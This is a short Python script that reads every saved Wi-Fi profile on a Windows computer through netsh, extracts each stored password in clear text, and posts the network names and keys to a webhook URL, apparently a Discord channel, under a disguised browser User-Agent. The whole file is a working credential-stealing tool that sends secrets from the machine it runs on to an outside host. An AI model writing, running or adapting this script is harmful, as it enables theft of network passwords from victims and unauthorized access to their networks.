import subprocess
import json
from urllib.request import Request, urlopen

rawdata = subprocess.check_output(["netsh","wlan","show","profiles"]).decode("utf-8").split("\n")

profiles = [i.split(":")[1][1:-1] for i in rawdata if "All User Profile" in i]

##########################################################
PING_ME = True #Do you want to be pinged?
WEBHOOK_URL = 'ENTER HERE' #Enter your webhook URL here

if PING_ME:
    message = "@everyone ```"
##########################################################

for i in profiles:

    results = subprocess.check_output(["netsh","wlan","show","profile",i,"key=clear"]).decode("utf-8").split("\n")

    results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]

    try:
        message += ("{:<30}| {:<}".format(i, results[0]))

    except IndexError:
        message += ("{:<30}| {:<}".format(i, ""))

message += "```"

#Defines the code
def main():

    #Defines the headers
    headers = {
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
        }

    #Defines the payload to be sent, the contents of the file to be sent are read.
    payload = json.dumps({'content': message})

    #Defines the request
    req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)

    #Executes the request by opening the URL url
    urlopen(req)

#Executes the code
main()